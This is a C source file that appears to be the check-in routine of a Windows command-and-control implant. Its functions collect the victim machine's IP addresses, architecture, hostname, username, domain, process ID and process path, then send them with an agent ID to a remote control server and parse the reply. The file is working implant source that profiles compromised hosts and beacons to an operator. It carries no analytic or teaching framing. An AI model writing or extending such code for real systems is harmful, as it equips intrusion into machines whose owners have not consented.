#include "Checkin.h"
#include "ceos.h"
#pragma comment(lib, "iphlpapi.lib")
#include <iphlpapi.h>


// Getting all the IP addresses. 
UINT32* getIPAddress(UINT32* numberOfIPs)
{
	PMIB_IPADDRTABLE pIPAddrTable;
	DWORD dwSize = 0;
	DWORD dwRetVal = 0;
	IN_ADDR IPAddr;
	LPVOID lpMsgBuf;

	pIPAddrTable = (MIB_IPADDRTABLE*)LocalAlloc(LPTR, sizeof(MIB_IPADDRTABLE));
	if (pIPAddrTable)
	{
		if (GetIpAddrTable(pIPAddrTable, &dwSize, 0) == ERROR_INSUFFICIENT_BUFFER)
		{
			LocalFree(pIPAddrTable);
			pIPAddrTable = (MIB_IPADDRTABLE*)LocalAlloc(LPTR, dwSize);
		}
		if (pIPAddrTable == NULL)
			return NULL;
	}

	else
		return NULL;

	if ((dwRetVal = GetIpAddrTable(pIPAddrTable, &dwSize, 0)) != NO_ERROR)
		return NULL;
	else
		*numberOfIPs = (UINT32)pIPAddrTable->dwNumEntries;
	

	UINT32* tableOfIPs = (UINT32*)LocalAlloc(LPTR, (*numberOfIPs) * sizeof(UINT32));
	for (UINT32 i = 0; i < *numberOfIPs; i++)
	{
		IPAddr.S_un.S_addr = (u_long)pIPAddrTable->table[i].dwAddr;
		tableOfIPs[i] = BYTESWAP32(IPAddr.S_un.S_addr);
	}

	if (pIPAddrTable)
		LocalFree(pIPAddrTable);

	
	return tableOfIPs;
}


// Getting the current architecture
BYTE getArch()
{
	SYSTEM_INFO systemInfo;
	GetNativeSystemInfo(&systemInfo);
	if (systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64
		|| systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
	{
		return 0x64;
	}

	return 0x86;
}

// Getting the current hostname
PCHAR getHostname()
{
	LPSTR data = NULL;
	DWORD dataLen = 0;
	const char* hostnameRep = "N/A";
	if (!GetComputerNameExA(ComputerNameNetBIOS, NULL, &dataLen))
	{
		if (data = (LPSTR)LocalAlloc(LPTR, dataLen))
		{
			GetComputerNameExA(ComputerNameNetBIOS, data, &dataLen);
			hostnameRep = data;
		}
	}
	return (char*)hostnameRep;
}

// Getting the username of the current user
char* getUserName()
{
	LPSTR data = NULL;
	DWORD dataLen = 0;
	const char* userName = "N/A";
	if (!GetUserNameA(NULL, &dataLen))
	{
		if (data = (LPSTR)LocalAlloc(LPTR, dataLen))
		{
			GetUserNameA(data, &dataLen);
			userName = data;
		}
	}
	return (char*)userName;
}

// Getting the domain from the machine
LPWSTR getDomain()
{
	DWORD dwLevel = 102;
	LPWKSTA_INFO_102 pBuf = NULL;
	PWCHAR domain = NULL;
	NET_API_STATUS nStatus;
	LPWSTR pszServerName = NULL;
	nStatus = NetWkstaGetInfo(pszServerName, dwLevel, (LPBYTE*)&pBuf);
	if (nStatus == NERR_Success)
	{
		DWORD length = lstrlenW(pBuf->wki102_langroup);
		domain = (PWCHAR)LocalAlloc(LPTR, sizeof(WCHAR) * length);
		memcpy(domain, pBuf->wki102_langroup, sizeof(WCHAR) * length);
	}
	if (pBuf != NULL)
		NetApiBufferFree(pBuf);
	return domain;
}

// Getting the current OS Name (not implemented)
char* getOsName()
{
	return (PCHAR)"Windows";
}

// Getting the current process name
char* getCurrentProcName()
{
	char* processName = NULL;
	HANDLE handle = GetCurrentProcess();
	if (handle)
	{
		DWORD buffSize = 1024;
		CHAR buffer[1024];
		if (QueryFullProcessImageNameA(handle, 0, buffer, &buffSize))
		{
			processName = (char*)LocalAlloc(LPTR, buffSize + 1);
			memcpy(processName, buffer, buffSize);
		}
		CloseHandle(handle);
	}
	return processName;
}


PParser checkin()
{
	UINT32 numberOfIPs = 0;

	PPackage checkin = newPackage(CHECKIN, TRUE);
	addString(checkin, (PCHAR)ceosConfig->agentID, FALSE);

	// IP addresses;
	UINT32* tableOfIPs = getIPAddress(&numberOfIPs);
	addInt32(checkin, numberOfIPs);
	for (UINT32 i=0 ; i< numberOfIPs; i++)
		addInt32(checkin, tableOfIPs[i]);
	
	// OS 
	addString(checkin, getOsName(), TRUE);
	// Arch
	addByte(checkin, getArch());
	// Hostname
	addString(checkin, getHostname(), TRUE);
	// Username
	addString(checkin, getUserName(), TRUE);
	// Domain
	addWString(checkin, getDomain(), TRUE);
	// PID
	addInt32(checkin, GetCurrentProcessId());
	// ProcessName
	addString(checkin, getCurrentProcName(), TRUE);
	// External IP (useless)
	addString(checkin, (PCHAR)"1.1.1.1", TRUE);

	Parser* ResponseParser = sendPackage(checkin);

	freePackage(checkin);

	if (!ResponseParser)
		return NULL;

	return ResponseParser;
}
